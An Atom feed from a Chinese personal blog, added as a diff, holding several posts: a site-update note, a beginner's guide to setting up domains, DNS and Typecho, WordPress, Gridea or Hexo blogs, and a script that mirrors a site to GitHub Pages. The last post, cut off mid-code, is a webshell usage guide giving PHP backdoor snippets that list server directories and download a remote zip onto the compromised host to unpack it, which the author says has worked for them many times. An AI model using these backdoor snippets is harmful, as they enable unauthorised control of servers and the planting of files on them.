@@ -1,0 +1,604 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"
+xmlns:thr="http://purl.org/syndication/thread/1.0"
+xml:lang="zh-CN"
+xml:base="https://2890.ltd/category/w3.html"
+>
+<title type="text">OKYes! 个人博客 - 网络</title>
+<subtitle type="text"></subtitle>
+<updated>2021-05-01T21:07:00+08:00</updated>
+<generator uri="http://typecho.org/" version="1.2/18.1.29">Typecho</generator>
+<link rel="alternate" type="text/html" href="https://2890.ltd/category/w3.html" />
+<id>https://2890.ltd/feed/atom/category/w3.html</id>
+<link rel="self" type="application/atom+xml" href="https://2890.ltd/feed/atom/category/w3.html" />
+<entry>
+<title type="html"><![CDATA[New Update | 2890全新升级]]></title>
+<link rel="alternate" type="text/html" href="https://2890.ltd/blog/Update-20210501.html" />
+<id>https://2890.ltd/blog/Update-20210501.html</id>
+<updated>2021-05-01T21:07:00+08:00</updated>
+<published>2021-05-01T21:07:00+08:00</published>
+<author>
+    <name>Given | 秋庭 そう</name>
+    <uri>https://2890.ltd</uri>
+</author>
+<summary type="html"><![CDATA[时光从不会因为谁的止步不前而停滞，转眼，2021年已过去一半，正值五一假期，为博客带来一次翻新前端前端放弃了使用了一年半的Mirages主题（在我的破机器上打开就掉帧，至今未解决） ，正好服务器...]]></summary>
+<content type="html" xml:base="https://2890.ltd/blog/Update-20210501.html" xml:lang="zh-CN"><![CDATA[
+<blockquote>时光从不会因为谁的止步不前而停滞，转眼，2021年已过去一半，正值五一假期，为博客带来一次翻新</blockquote><h2 id="toc_0">前端</h2><p>前端放弃了使用了一年半的Mirages主题（在我的破机器上打开就掉帧，至今未解决） ，正好服务器也需要稍微重装一下，所以便有了今天一整天的折腾。</p><h3 id="toc_1">Removed features</h3><ol><li>砍掉了拖慢加载的平滑滚动</li><li>砍掉了对性能影响大的一些框架</li><li>砍掉了效用不佳的CDN加速</li></ol><h3 id="toc_2">Added Features</h3><ol><li>新增了底部一言</li><li>用户登录系统，可以提供注册登录了</li></ol><h2 id="toc_3">后端</h2><p>这个站是2019年5月建成的，所以Typecho用得是当时的老稳定版（虽说版本号也是1.1），两年来不曾更新，然后到了现在，发现已经无法更新了（并且使用的是SQLite，很多插件也不兼容），于是下决心将其更新，使用navicat导出数据后发现全是BUG（半年前SQLite对拷到MySQL还可以正常使用，参考<a href="https://dev.2890.ltd/blogdev/">Akiba Blog Dev</a>，没办法，那咱只能手搬。</p><p>花了一个下午从51篇文章里精选出了19篇高质量的文章，剩下的文章可以在Dev中找到（</p><p><del>（其实要搬的主要原因是因为原本无序的文件结构和根目录的无序，搞了一天，清爽多了。)</del></p><h2 id="toc_4">迁移过程</h2><p>首先祭出万能navicat把SQLite数据库里的数据导入到MySQL</p><p><figure><img class="" alt="" data-src="https://cdn.hyh.ink/img/20210501210001.png#vwid=776&vhei=598" src="https://cdn.hyh.ink/img/20210501210001.png#vwid=776&vhei=598"></figure></p><p>然后发现有一些东西不能正常使用（如Mirages的插件），排查错误，两小时无进展，邃开始手动迁移。</p><p>手动把文章迁移完毕后发现cid对不上评论的cid导致99%的评论都错位或者不显示了，所以打算接入Waline，发现夜间模式难以与主题强制夜间模式同步，所以弃用<del>（其实是懒得搞）</del>，打算之后再来慢慢弄评论</p><p>还有就是弃用了效用不佳的原邮件推送（反正根本到达不了，推没推都一样），正在思考新的解决方案。</p><h2 id="toc_5">写在最后</h2><p>博客对我的意义是什么呢，我变得迷茫了，原本博客只是一个记录生活的工具，只是记录那一瞬的灵光一现，但是现在越来越难沉下心来写作了，于是博客里多了一个Gossip页面用于记录灵感（晚些会将实现方式发出），相信这个难得的假期我还会发些更新的</p><p>Best Wishes</p>
+]]></content>
+<link rel="replies" type="text/html" href="https://2890.ltd/blog/Update-20210501.html#comments" thr:count="1" />
+<link rel="replies" type="application/atom+xml" href="https://2890.ltd/feed/atom/blog/Update-20210501.html" thr:count="1"/>
+</entry>
+<entry>
+<title type="html"><![CDATA[面相初学者的建站教程：如何搭建属于自己的博客]]></title>
+<link rel="alternate" type="text/html" href="https://2890.ltd/blog/how-to-build-your-own-blog.html" />
+<id>https://2890.ltd/blog/how-to-build-your-own-blog.html</id>
+<updated>2021-02-02T23:26:00+08:00</updated>
+<published>2021-02-02T23:26:00+08:00</published>
+<author>
+    <name>Given | 秋庭 そう</name>
+    <uri>https://2890.ltd</uri>
+</author>
+<summary type="html"><![CDATA[转眼间已经到达了2021年，这几年博客圈的变化可谓是翻天覆地，服务器、域名的获取渠道更多，价格更佳亲民，甚至许多大厂专门开设了学生专区，以便学生群体可以更方便，更便宜的购得一台属于自己的服务器，...]]></summary>
+<content type="html" xml:base="https://2890.ltd/blog/how-to-build-your-own-blog.html" xml:lang="zh-CN"><![CDATA[
+<p>转眼间已经到达了2021年，这几年博客圈的变化可谓是翻天覆地，服务器、域名的获取渠道更多，价格更佳亲民，甚至许多大厂专门开设了学生专区，以便学生群体可以更方便，更便宜的购得一台属于自己的服务器，这也导致了互联网上有了更多00后的身影，但是不是每一个人都有技术可以完成我们已经习以为常的建站步骤，于是今天，这篇教程对几乎所有“有完全的理解能力”的年龄段都通用</p><h2 id="toc_6">确定你想要的类型</h2><p>博客程序主要分为静态博客和动态博客，两者最大的区别是静态博客无需拥有自己的服务器，可以做到完全免维护，而动态博客需要一台服务器，当然也可以选择免费空间，两者差别不大。</p><h2 id="toc_7">域名</h2><p>无论是动态博客还是静态博客，你都需要一个域名来访问你的网站，这个域名可以是免费的也可以是付费的，免费域名主要来源是 <a href="https://freenom.com">Freenom</a> ，付费域名你可以在各大注册商注册</p><h4 id="toc_8">免费域名</h4><p>==Freenom 使用中国IP注册有域名回收风险，请自行解决风险==</p><p>在 <a href="https://www.freenom.com/">Freenom官网</a> 搜索你想要的域名并检查可用性<figure><img class="" alt="image-20210131222535761" data-src="https://cdn.hyh.ink/img/20210131222536.png#mirages-width=1920&mirages-height=905&mirages-cdn-type=2#vwid=1920&vhei=905" src="https://cdn.hyh.ink/img/20210131222536.png#mirages-width=1920&mirages-height=905&mirages-cdn-type=2#vwid=1920&vhei=905"><figcaption>image-20210131222535761</figcaption></figure></p><p>在下方标明==免费==的域名中选择一个你喜爱的域名，点击现在获取，进入购物车</p><p>==注意== 此处一定要选<code>12Months@Free</code>选项，默认选择三个月免费<figure><img class="" alt="image-20210131222740384" data-src="https://cdn.hyh.ink/img/20210131222740.png#mirages-width=1359&mirages-height=639&mirages-cdn-type=2#vwid=1359&vhei=639" src="https://cdn.hyh.ink/img/20210131222740.png#mirages-width=1359&mirages-height=639&mirages-cdn-type=2#vwid=1359&vhei=639"><figcaption>image-20210131222740384</figcaption></figure></p><p>点击Continue继续</p><p>在此处填入一个==可用的==电子邮箱地址</p><p><figure><img class="" alt="image-20210131222912580" data-src="https://cdn.hyh.ink/img/20210131222912.png#mirages-width=1460&mirages-height=697&mirages-cdn-type=2#vwid=1460&vhei=697" src="https://cdn.hyh.ink/img/20210131222912.png#mirages-width=1460&mirages-height=697&mirages-cdn-type=2#vwid=1460&vhei=697"><figcaption>image-20210131222912580</figcaption></figure></p><p>检查你的邮箱，寻找来自Freenom的邮件</p><p><figure><img class="" alt="image-20210131223015832" data-src="https://cdn.hyh.ink/img/20210131223015.png#mirages-width=1235&mirages-height=563&mirages-cdn-type=2#vwid=1235&vhei=563" src="https://cdn.hyh.ink/img/20210131223015.png#mirages-width=1235&mirages-height=563&mirages-cdn-type=2#vwid=1235&vhei=563"><figcaption>image-20210131223015832</figcaption></figure></p><p>填入信息，所有信息都必须填写但是不一定真实</p><p><figure><img class="" alt="image-20210131223148065" data-src="https://cdn.hyh.ink/img/20210131223148.png#mirages-width=1120&mirages-height=854&mirages-cdn-type=2#vwid=1120&vhei=854" src="https://cdn.hyh.ink/img/20210131223148.png#mirages-width=1120&mirages-height=854&mirages-cdn-type=2#vwid=1120&vhei=854"><figcaption>image-20210131223148065</figcaption></figure></p><p>勾选此项，点击Complete Order<figure><img class="" alt="image-20210131223404838" data-src="https://cdn.hyh.ink/img/20210131223404.png#mirages-width=1292&mirages-height=152&mirages-cdn-type=2#vwid=1292&vhei=152" src="https://cdn.hyh.ink/img/20210131223404.png#mirages-width=1292&mirages-height=152&mirages-cdn-type=2#vwid=1292&vhei=152"><figcaption>image-20210131223404838</figcaption></figure></p><p><figure><img class="" alt="image-20210131223518587" data-src="https://cdn.hyh.ink/img/20210131223518.png#mirages-width=709&mirages-height=316&mirages-cdn-type=2#vwid=709&vhei=316" src="https://cdn.hyh.ink/img/20210131223518.png#mirages-width=709&mirages-height=316&mirages-cdn-type=2#vwid=709&vhei=316"><figcaption>image-20210131223518587</figcaption></figure></p><p>注册完成后进入My Domains</p><p><figure><img class="" alt="image-20210131223538828" data-src="https://cdn.hyh.ink/img/20210131223538.png#mirages-width=488&mirages-height=457&mirages-cdn-type=2#vwid=488&vhei=457" src="https://cdn.hyh.ink/img/20210131223538.png#mirages-width=488&mirages-height=457&mirages-cdn-type=2#vwid=488&vhei=457"><figcaption>image-20210131223538828</figcaption></figure></p><p>更改域名NS到你想要的服务商，我推荐使用CloudFlare、DnsPod中国或者阿里云DNS</p><p><figure><img class="" alt="image-20210131223825504" data-src="https://cdn.hyh.ink/img/20210131223825.png#mirages-width=1077&mirages-height=442&mirages-cdn-type=2#vwid=1077&vhei=442" src="https://cdn.hyh.ink/img/20210131223825.png#mirages-width=1077&mirages-height=442&mirages-cdn-type=2#vwid=1077&vhei=442"><figcaption>image-20210131223825504</figcaption></figure></p><p><figure><img class="" alt="image-20210131223847418" data-src="https://cdn.hyh.ink/img/20210131223847.png#mirages-width=1249&mirages-height=622&mirages-cdn-type=2#vwid=1249&vhei=622" src="https://cdn.hyh.ink/img/20210131223847.png#mirages-width=1249&mirages-height=622&mirages-cdn-type=2#vwid=1249&vhei=622"><figcaption>image-20210131223847418</figcaption></figure></p><h5 id="toc_9">CloudFlare</h5><p>如果使用CloudFlare，需要注册Cloudflare账户，打开<a href="https://dash.cloudflare.com/sign-up/">CloudFlare控制面板</a> 填写电子邮件和密码，注册账户并添加你的域名，选择free计划<figure><img class="" alt="image-20210131224144876" data-src="https://cdn.hyh.ink/img/20210131224145.png#mirages-width=1105&mirages-height=842&mirages-cdn-type=2#vwid=1105&vhei=842" src="https://cdn.hyh.ink/img/20210131224145.png#mirages-width=1105&mirages-height=842&mirages-cdn-type=2#vwid=1105&vhei=842"><figcaption>image-20210131224144876</figcaption></figure></p><p>一路继续，直到到达更改名称服务器页面，复制Cloudflare提供的名称服务器到Freenom面板</p><p><figure><img class="" alt="image-20210131224358729" data-src="https://cdn.hyh.ink/img/20210131224358.png#mirages-width=1064&mirages-height=526&mirages-cdn-type=2#vwid=1064&vhei=526" src="https://cdn.hyh.ink/img/20210131224358.png#mirages-width=1064&mirages-height=526&mirages-cdn-type=2#vwid=1064&vhei=526"><figcaption>image-20210131224358729</figcaption></figure></p><p><figure><img class="" alt="image-20210131224441792" data-src="https://cdn.hyh.ink/img/20210131224441.png#mirages-width=1220&mirages-height=591&mirages-cdn-type=2#vwid=1220&vhei=591" src="https://cdn.hyh.ink/img/20210131224441.png#mirages-width=1220&mirages-height=591&mirages-cdn-type=2#vwid=1220&vhei=591"><figcaption>image-20210131224441792</figcaption></figure></p><p>点击Change，接着等待一小段时间（最长72小时）的NS刷新，等待成功后可以进入下一步</p><h5 id="toc_10">DNSPOD&阿里云</h5><p>DNSPod与阿里云大同小异，这里选择阿里云做示范，进入阿里云控制台，添加域名</p><p>进入你的域名管理界面，复制提供的NS</p><p><figure><img class="" alt="image-20210131225158323" data-src="https://cdn.hyh.ink/img/20210131225158.png#mirages-width=976&mirages-height=345&mirages-cdn-type=2#vwid=976&vhei=345" src="https://cdn.hyh.ink/img/20210131225158.png#mirages-width=976&mirages-height=345&mirages-cdn-type=2#vwid=976&vhei=345"><figcaption>image-20210131225158323</figcaption></figure></p><p>同样进入Freenom控制台填入保存，等待即可生效</p><p>如果有条件可以考虑使用阿里云DNS个人专业版，支持更多功能，<a href="https://promotion.aliyun.com/ntms/yunparter/invite.html?userCode=manqic3o">购买链接</a></p><h4 id="toc_11">付费域名</h4><p>付费域名与免费域名一样，这里推荐阿里云，腾讯云进行注册，低价省心，但是需要实名认证，可能会有优惠，可选查看<a href="https://promotion.aliyun.com/ntms/yunparter/invite.html?userCode=manqic3o">阿里云</a>,<a href="https://curl.qcloud.com/m7iJg6Qd">腾讯云</a></p><p>若不想进行实名认证，可以选择Dynadot，同样支持支付宝等支付方式</p><p>购买域名前建议到<a href="https://www.nazhumi.com/">哪煮米</a>进行后缀比价，以便更划算的注册域名</p><hr><p>当你选择好了域名，是时候考虑博客程序了，静态博客可以部署在几乎任何地方以0成本运行，而动态博客则需要一台服务器（或者免费空间）来使他运行</p><p>我们推荐初学者使用动态博客，显然，动态博客会更简单且更方便</p><h2 id="toc_12">部署动态博客</h2><p>首先需要选择一个合适的服务器</p><h4 id="toc_13">服务器推荐</h4><p>大陆服务器域名需要备案才能使用，不推荐，但是可以看看，时不时会有香港服务器，腾讯云建议选择香港轻量，便宜高速 ,<a href="https://promotion.aliyun.com/ntms/yunparter/invite.html?userCode=manqic3o">阿里云</a>,<a href="https://curl.qcloud.com/m7iJg6Qd">腾讯云</a></p><p>海外（不包含港澳台）服务器，推荐从<a href="https://billing.virmach.com/aff.php?aff=9425">Virmach</a>、<a href="https://my.racknerd.com/aff.php?aff=1996">racknerd</a>等厂商购买，便宜且有保障，也可以从国人厂商<a href="http://redirect.rainyun.cn/?ref=6660">雨云</a>购买，观察了一段时间也挺稳定的</p><h4 id="toc_14">建站空间推荐</h4><p>免费空间我推荐<a href="http://idc.la">雲上蘿莉</a>的da面板免空（暂时缺货），知乎有大佬推荐其他的<a href="https://www.zhihu.com/question/24670868">链接</a>，自行斟酌</p><p>付费推荐<a href="http://redirect.rainyun.cn/?ref=6660">雨云</a>的宝塔空间</p><h3 id="toc_15">开始部署</h3><p>在国内博客圈里有不少博客程序，比较知名的有<a href="http://typecho.org/">Typecho</a>和<a href="https://cn.wordpress.org/">Wordpress</a></p><table><thead><tr><th align="left"> </th><th align="left">体积</th><th> </th><th> </th><th>功能</th><th>速度</th><th>服务器要求</th></tr></thead><tbody><tr><td align="left"><a href="http://typecho.org/">Typecho</a></td><td align="left">极小</td><td> </td><td> </td><td>较少（可通过插件扩展）</td><td>快</td><td>极低（还可以使用SQLite）</td></tr><tr><td align="left"><a href="https://cn.wordpress.org/">Wordpress</a></td><td align="left">大</td><td> </td><td> </td><td>极多（可通过插件扩展）</td><td>慢（可通过优化缓解）</td><td>高</td></tr></tbody></table><p>由上面的表格，相信聪慧的你一定可以做出决定，当然，这两个程序之间的迁移也非常简单。不用担心后续想迁移</p><h3 id="toc_16">Typecho</h3><p>Typecho的安装相对简单，这里用Easypanel免空做演示，找到你的在线文件管理器</p><p><figure><img class="" alt="image-20210201000247494" data-src="https://cdn.hyh.ink/img/20210201000247.png#mirages-width=233&mirages-height=164&mirages-cdn-type=2#vwid=233&vhei=164" src="https://cdn.hyh.ink/img/20210201000247.png#mirages-width=233&mirages-height=164&mirages-cdn-type=2#vwid=233&vhei=164"><figcaption>image-20210201000247494</figcaption></figure></p><p>进入WWW目录，上传你的typecho程序（需要打包成zip格式）<figure><img class="" alt="image-20210131235153274" data-src="https://cdn.hyh.ink/img/20210131235153.png#mirages-width=784&mirages-height=195&mirages-cdn-type=2#vwid=784&vhei=195" src="https://cdn.hyh.ink/img/20210131235153.png#mirages-width=784&mirages-height=195&mirages-cdn-type=2#vwid=784&vhei=195"><figcaption>image-20210131235153274</figcaption></figure></p><p>将你的域名绑定到主机并且解析，以Cloudflare为例，在DNS面板添加记录，选择A记录或者Cname记录（按主机商提供的为准），推荐打开“代理”，既使用CloudFlare提供的CDN服务<figure><img class="" alt="image-20210201000107806" data-src="https://cdn.hyh.ink/img/20210201000107.png#mirages-width=1015&mirages-height=289&mirages-cdn-type=2#vwid=1015&vhei=289" src="https://cdn.hyh.ink/img/20210201000107.png#mirages-width=1015&mirages-height=289&mirages-cdn-type=2#vwid=1015&vhei=289"><figcaption>image-20210201000107806</figcaption></figure></p><p>等待生效后访问你的网站，会出现Typecho安装向导，点击下一步<figure><img class="" alt="image-20210201000446537" data-src="https://cdn.hyh.ink/img/20210201000446.png#mirages-width=904&mirages-height=915&mirages-cdn-type=2#vwid=904&vhei=915" src="https://cdn.hyh.ink/img/20210201000446.png#mirages-width=904&mirages-height=915&mirages-cdn-type=2#vwid=904&vhei=915"><figcaption>image-20210201000446537</figcaption></figure></p><p>这里建议使用SQLite，轻量化，容易备份</p><p>填完所有内容，然后安装，这样一个Typecho博客就部署完成了，但是就这样还不够，推荐安装<a href="https://github.com/jzwalk/TeStore">TeStore</a> 插件，主题可以在<a href="https://typecho.me/">Typecho Themes</a> 中找寻自己喜欢的，若有问题或需求可以在下方留言，安装后强烈建议开启伪静态！</p><p>安装插件/主题方法：</p><p>将插件放在usr/plugins目录/将主题放在usr/themes目录</p><p>==若使用免费空间请做好备份！ 避免数据丢失==</p><h3 id="toc_17">WordPress</h3><p>WordPress 也和typecho相像，依然将主程序上传到www目录，解压，访问域名就可以安装。</p><p>解压后目录大致应像这样</p><p><figure><img class="" alt="image-20210201001639859" data-src="https://cdn.hyh.ink/img/20210201001640.png#mirages-width=1566&mirages-height=836&mirages-cdn-type=2#vwid=1566&vhei=836" src="https://cdn.hyh.ink/img/20210201001640.png#mirages-width=1566&mirages-height=836&mirages-cdn-type=2#vwid=1566&vhei=836"><figcaption>image-20210201001639859</figcaption></figure></p><p><figure><img class="" alt="image-20210201001707530" data-src="https://cdn.hyh.ink/img/20210201001707.png#mirages-width=1799&mirages-height=700&mirages-cdn-type=2#vwid=1799&vhei=700" src="https://cdn.hyh.ink/img/20210201001707.png#mirages-width=1799&mirages-height=700&mirages-cdn-type=2#vwid=1799&vhei=700"><figcaption>image-20210201001707530</figcaption></figure></p><p><figure><img class="" alt="image-20210201001855883" data-src="https://cdn.hyh.ink/img/20210201001856.png#mirages-width=955&mirages-height=584&mirages-cdn-type=2#vwid=955&vhei=584" src="https://cdn.hyh.ink/img/20210201001856.png#mirages-width=955&mirages-height=584&mirages-cdn-type=2#vwid=955&vhei=584"><figcaption>image-20210201001855883</figcaption></figure></p><p>WordPress还可以搭配其独有的手机客户端进行写作，可以在App Store和Play Store下载</p><p>主题可以在wordpress内下载安装，也可以从GitHub寻找，推荐主题：<a href="https://github.com/mirai-mamori/Sakurairo">IRO</a></p><h2 id="toc_18">部署静态博客</h2><p>静态博客有几大解决方案，如<a href="https://hexo.io">Hexo</a>、<a href="http://gohugo.io/">Hugo</a>、<a href="https://jekyllcn.com/">Jekyll</a>、<a href="https://gridea.dev">Gridea</a></p><p>本文主要介绍简单上手的Gridea和可以基本在所有客户端构建的Hexo（其余几个理论可行，没有实践）</p><h3 id="toc_19">Gridea上手</h3><p>Gridea是一个国人开发的免费静态博客生成器，他与Hexo一样使用Node.js编写，推荐他的原因是他拥有强大的图形化界面，简单易用，可是很遗憾，他并没有手机端，也就是说你无法在手机上使用Gridea（除了付费的在线版）</p><p>Gridea支持多种部署方式，我推荐使用Coding Pages或者Github Pages，Coding Pages在国内更快，更友好，但是需要实名认证，所以本文以Github Pages服务举例</p><p>首先注册一个GitHub账户，创建一个仓库，类型一定要公开（Public）</p><p><figure><img class="" alt="image-20210201003624248" data-src="https://cdn.hyh.ink/img/20210201003624.png#mirages-width=857&mirages-height=610&mirages-cdn-type=2#vwid=857&vhei=610" src="https://cdn.hyh.ink/img/20210201003624.png#mirages-width=857&mirages-height=610&mirages-cdn-type=2#vwid=857&vhei=610"><figcaption>image-20210201003624248</figcaption></figure></p><p>创建后进入仓库设置，<figure><img class="" alt="image-20210201003659041" data-src="https://cdn.hyh.ink/img/20210201003659.png#mirages-width=1206&mirages-height=117&mirages-cdn-type=2#vwid=1206&vhei=117" src="https://cdn.hyh.ink/img/20210201003659.png#mirages-width=1206&mirages-height=117&mirages-cdn-type=2#vwid=1206&vhei=117"><figcaption>image-20210201003659041</figcaption></figure></p><p>拉到下面，找到Github Pages服务</p><p><figure><img class="" alt="233" data-src="https://cdn.hyh.ink/img/20210201003842.png#mirages-width=1920&mirages-height=1011&mirages-cdn-type=2#vwid=1920&vhei=1011" src="https://cdn.hyh.ink/img/20210201003842.png#mirages-width=1920&mirages-height=1011&mirages-cdn-type=2#vwid=1920&vhei=1011"><figcaption>233</figcaption></figure></p><p><figure><img class="" alt="image-20210201004032961" data-src="https://cdn.hyh.ink/img/20210201004033.png#mirages-width=875&mirages-height=360&mirages-cdn-type=2#vwid=875&vhei=360" src="https://cdn.hyh.ink/img/20210201004033.png#mirages-width=875&mirages-height=360&mirages-cdn-type=2#vwid=875&vhei=360"><figcaption>image-20210201004032961</figcaption></figure></p><p>然后点击Save</p><p>之后进入<a href="https://github.com/settings/tokens/new">链接</a>创建一个新的token用于Gridea<br><figure><img class="" alt="" data-src="https://cdn.hyh.ink/img/2021/02/02/16122773809703_eoluwimlgktfmp9l7fegsdygo4xx94mk.jpg#mirages-width=1018&mirages-height=557&mirages-cdn-type=2#vwid=1018&vhei=557" src="https://cdn.hyh.ink/img/2021/02/02/16122773809703_eoluwimlgktfmp9l7fegsdygo4xx94mk.jpg#mirages-width=1018&mirages-height=557&mirages-cdn-type=2#vwid=1018&vhei=557"></figure><br>勾选repo下面的就够了，生成token之请保存好此token，此token将不会再显示，把上述信息填入Gridea，保存就可以开始写作了</p><h3 id="toc_20">Hexo上手</h3><p>Hexo是一个基于node.js的，可以在多端使用的静态博客生成软件，你可以在Apple设备，安卓设备，各种系统的电脑上使用Hexo，只需要几个命令就可以生成一个漂亮的静态博客<br>在几乎所有系统上，你只需要用包管理器安装nodejs和npm，然后<code>sudo npm install hexo</code>就完成了<br><figure><img class="" alt="" data-src="https://cdn.hyh.ink/img/2021/02/02/16122777205977_eg4xm0kdr5n332895v1zg27cm20elndh.jpg#mirages-width=570&mirages-height=365&mirages-cdn-type=2#vwid=570&vhei=365" src="https://cdn.hyh.ink/img/2021/02/02/16122777205977_eg4xm0kdr5n332895v1zg27cm20elndh.jpg#mirages-width=570&mirages-height=365&mirages-cdn-type=2#vwid=570&vhei=365"></figure><br>对于安卓设备，我建议使用termux作为终端应用，ios的话使用ish就可以使用hexo了<br>使用你自己Linux发行版的包管理器安装nodejs和git</p><pre><code>npm install hexo-cli -g
+npm install hexo-deployer-git --save
+git config --global user.name &quot;你的GitHub用户名&quot;
+git config --global user.email &quot;你的GitHub注册邮箱&quot;</code></pre><p>生成ssh密钥文件：<br><code>ssh-keygen -t rsa -C &quot;你的GitHub注册邮箱&quot;</code><br>然后直接三个回车即可，默认不需要设置密码<br>然后找到生成的.ssh的文件夹中的id_rsa.pub密钥，将内容全部复制<br>打开 <a href="https://github.com/settings/keys">GitHub_Settings_keys</a>，新建new SSH Key<br>粘贴刚才复制的内容，保存</p><p>之后进入一个目录</p><pre><code>mkdir hexo
+cd hexo
+hexo init</code></pre><p>找到目录中的_config.yml文件<br>将下面内容加入此文件来绑定github推送</p><pre><code>deploy:
+type: git
+repo: 这里填入你之前在GitHub上创建仓库的完整路径，记得加上 .git
+branch: master</code></pre><p>之后输入</p><pre><code>hexo clean 
+hexo g 
+hexo d</code></pre><p>之后，你的网站就推送到了github上了（以及你的绑定域名上）</p><p>因本文长度有限，hexo的更多强大功能就不多赘述了，想要了解更多hexo功能可以参考<a href="https://zhuanlan.zhihu.com/p/26625249">知乎</a></p><hr><p>如果你真的完全跟着这篇文章操作，那么你大多已经成功部署了一个属于自己的博客<br>如果有问题，可以在下方留言，我会一一解答，下篇文章将会解决现在的网站访问速度慢的问题<br>顺便介绍强大的VPS网页控制面板宝塔的使用</p>
+]]></content>
+<link rel="replies" type="text/html" href="https://2890.ltd/blog/how-to-build-your-own-blog.html#comments" thr:count="0" />
+<link rel="replies" type="application/atom+xml" href="https://2890.ltd/feed/atom/blog/how-to-build-your-own-blog.html" thr:count="0"/>
+</entry>
+<entry>
+<title type="html"><![CDATA[10分钟，0经费让你的网站告别黑洞]]></title>
+<link rel="alternate" type="text/html" href="https://2890.ltd/blog/10-minutes-for-your-website-to-say-goodbye-to-the-black-hole.html" />
+<id>https://2890.ltd/blog/10-minutes-for-your-website-to-say-goodbye-to-the-black-hole.html</id>
+<updated>2020-03-26T11:02:00+08:00</updated>
+<published>2020-03-26T11:02:00+08:00</published>
+<author>
+    <name>Given | 秋庭 そう</name>
+    <uri>https://2890.ltd</uri>
+</author>
+<summary type="html"><![CDATA[做网站，被打已经是家常便饭了，可是每次被打，无防的阿里云、腾讯云的最低级的VPS一碰就死，几乎没有挣扎的余地，但是我们可以通过GitHub、Coding等等HTML托管服务（Pages服务）来让...]]></summary>
+<content type="html" xml:base="https://2890.ltd/blog/10-minutes-for-your-website-to-say-goodbye-to-the-black-hole.html" xml:lang="zh-CN"><![CDATA[
+<p>做网站，被打已经是家常便饭了，可是每次被打，无防的阿里云、腾讯云的最低级的VPS一碰就死，几乎没有挣扎的余地，但是我们可以通过GitHub、Coding等等HTML托管服务（Pages服务）来让你的网站有一个全量镜像。</p><h2 id="toc_21">成品效果</h2><blockquote>感谢夜杏提供HTML单页</blockquote><p>[hide]<br>[btn url="https://mir.2890.ltd"]我的镜像传送门[/btn]<br>[/hide]<br>[hide] <figure><img class="" alt="" data-src="https://cdn.hyh.ink/2020/03/584915723.png#mirages-width=1356&mirages-height=661&mirages-cdn-type=2#vwid=1356&vhei=661" src="https://cdn.hyh.ink/2020/03/584915723.png#mirages-width=1356&mirages-height=661&mirages-cdn-type=2#vwid=1356&vhei=661"></figure> [/hide]<br>[hide] <figure><img class="" alt="" data-src="https://cdn.hyh.ink/2020/03/1988481188.png#mirages-width=1365&mirages-height=672&mirages-cdn-type=2#vwid=1365&vhei=672" src="https://cdn.hyh.ink/2020/03/1988481188.png#mirages-width=1365&mirages-height=672&mirages-cdn-type=2#vwid=1365&vhei=672"></figure> [/hide]</p><h2 id="toc_22">现在存在的问题</h2><ol><li>不支持Pio插件</li><li>不支持Mirages的PJAX</li><li>不支持Typecho原生评论<del>（废话）</del></li></ol><h2 id="toc_23">如何制作</h2><p>使用之前请粗略的了解Git的使用方法，本人只讲原理，不贴图<del>（懒）</del><br>首先，注册一个GitHub或Coding账户，开一个新的Repo（GItHub命名请命名为Yourname.github.io）<br>使用SSH keygen创建一个新的ssh公钥，上传到Coding或者Github<br>然后使用crontab制作一个计划任务，ssh脚本为<br>[hide]<br>crontab用脚本</p><pre><code>rm -rf /www/wwwroot/网站目录/网址/*
+cd /www/wwwroot/网站目录
+wget -r -p -np -k 网址
+sudo sh /www/wwwroot/wdnmd.sh</code></pre><p>[/hide]<br>[hide]<br>wdnmd.sh</p><pre><code>cd /www/wwwroot/网站目录
+git config --global credential.helper store
+git config --global user.email &quot;Email&quot;
+git config --global user.name &quot;Your name&quot;
+git add .
+git commit -m &quot;update&quot;
+git push origin master</code></pre><p>[/hide]<br>使用代码之前请在你的网站目录初始化Git<br>使用<code>git init</code>，然后 <code>git remote add origin Git 仓库ssh地址</code>然后<code>git pull origin master</code>拉取一次远程仓库，然后就可以执行脚本了。<br>执行脚本后，你的网站就会被部署到Coding或Github上（Coding需要使用DevOps仓库并且在部署中打开静态Pages）</p>
+]]></content>
+<link rel="replies" type="text/html" href="https://2890.ltd/blog/10-minutes-for-your-website-to-say-goodbye-to-the-black-hole.html#comments" thr:count="0" />
+<link rel="replies" type="application/atom+xml" href="https://2890.ltd/feed/atom/blog/10-minutes-for-your-website-to-say-goodbye-to-the-black-hole.html" thr:count="0"/>
+</entry>
+<entry>
+<title type="html"><![CDATA[如何优雅的使用你的WebShell II]]></title>
+<link rel="alternate" type="text/html" href="https://2890.ltd/blog/74.html" />
+<id>https://2890.ltd/blog/74.html</id>
+<updated>2020-02-20T10:27:00+08:00</updated>
+<published>2020-02-20T10:27:00+08:00</published>
+<author>
+    <name>Given | 秋庭 そう</name>
+    <uri>https://2890.ltd</uri>
+</author>
+<summary type="html"><![CDATA[上篇文章我们介绍了我推荐的WebShell，这篇我们来说说如何通过这个WebShell干一些其他事，这篇文章里我就不说访问啥了，直接放代码1.使用后门获取目录信息这个不多说，有PHP基础的应该都...]]></summary>
+<content type="html" xml:base="https://2890.ltd/blog/74.html" xml:lang="zh-CN"><![CDATA[
+<p>上篇文章我们介绍了我推荐的WebShell，这篇我们来说说如何通过这个WebShell干一些其他事，这篇文章里我就不说访问啥了，直接放代码</p><h2 id="toc_24">1.使用后门获取目录信息</h2><p>这个不多说，有PHP基础的应该都会用</p><pre><code>$dir =  dirname(__FILE__);$file = scandir($dir);echo &quot; &lt;pre&gt;&quot;;print_r($file);</code></pre><p>这个dirname(__FILE__)是可以更改为相对路径的，比如你的后门在3层目录中，可以将$dir赋值为<code>../../</code>，所得结果将以一个数组print出来。<br>像这样<br><figure><img class="" alt="" data-src="https://cdn.hyh.ink/2020/02/2352606418.png#mirages-width=409&mirages-height=448&mirages-cdn-type=2#vwid=409&vhei=448" src="https://cdn.hyh.ink/2020/02/2352606418.png#mirages-width=409&mirages-height=448&mirages-cdn-type=2#vwid=409&vhei=448"></figure></p><h2 id="toc_25">2.使用后门解压，释放文件</h2><p>这个方法我其实是不想分享出来的。毕竟屡试不爽嘛，其实很简单，代码如下</p><pre><code>$down=file_get_contents('http://压缩包下载地址.zip');file_put_contents('update.zip',$down);$zip = new ZipArchive; $zip-&gt;open('./update.zip') &amp;&amp; 